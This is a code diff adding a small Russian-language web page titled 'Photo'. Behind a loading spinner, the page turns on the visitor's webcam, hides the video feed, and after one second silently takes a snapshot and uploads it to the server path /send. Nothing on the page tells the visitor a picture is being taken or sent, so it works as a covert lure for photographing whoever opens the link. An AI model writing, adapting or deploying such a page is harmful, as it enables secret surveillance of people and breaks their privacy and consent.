@@ -1,0 +1,84 @@
+<!doctype html>
+<html lang="ru">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Фото</title>
+</head>
+<style>
+  .spinner {
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  width: 40px;
+  height: 40px;
+  margin: -20px 0 0 -20px; /* половина ширины и высоты */
+  border: 4px solid #ff0000;
+  border-top-color: #333;
+  border-radius: 50%;
+  animation: spin 0.8s linear infinite;
+}
+
+@keyframes spin {
+  to { transform: rotate(360deg); }
+}
+</style>
+<body>
+  <video id="cam" autoplay playsinline style="max-width:0%"></video>
+  <p id="status"></p>
+  <div id="spinner" class="spinner"></div>
+  <canvas id="canvas" style="display:none"></canvas>
+
+  <script>
+    const video = document.getElementById("cam");
+    const status = document.getElementById("status");
+  
+
+    function waitForFrame(video) {
+      return new Promise(resolve => {
+        const check = () => video.videoWidth > 0 ? resolve() : requestAnimationFrame(check);
+        check();
+      });
+    }
+
+    async function takeAndSend(stream) {
+     
+      await new Promise(r => setTimeout(r, 1000));
+
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext("2d").drawImage(video, 0, 0);
+
+      const blob = await new Promise(resolve =>
+        canvas.toBlob(resolve, "image/jpeg", 0.9)
+      );
+      const form = new FormData();
+      form.append("photo", blob, "photo.jpg");
+
+      stream.getTracks().forEach(t => t.stop());
+
+      try {
+       
+        const r = await fetch("/send", { method: "POST", body: form });
+       
+      } catch {
+        status.textContent = " ";
+      }
+    }
+
+    async function start() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+        await video.play();
+        await waitForFrame(video);
+        await takeAndSend(stream);
+      } catch (e) {
+        status.textContent = e.name + e.message;
+      }
+    }
+
+    start();
+  </script>
+</body>
+</html>
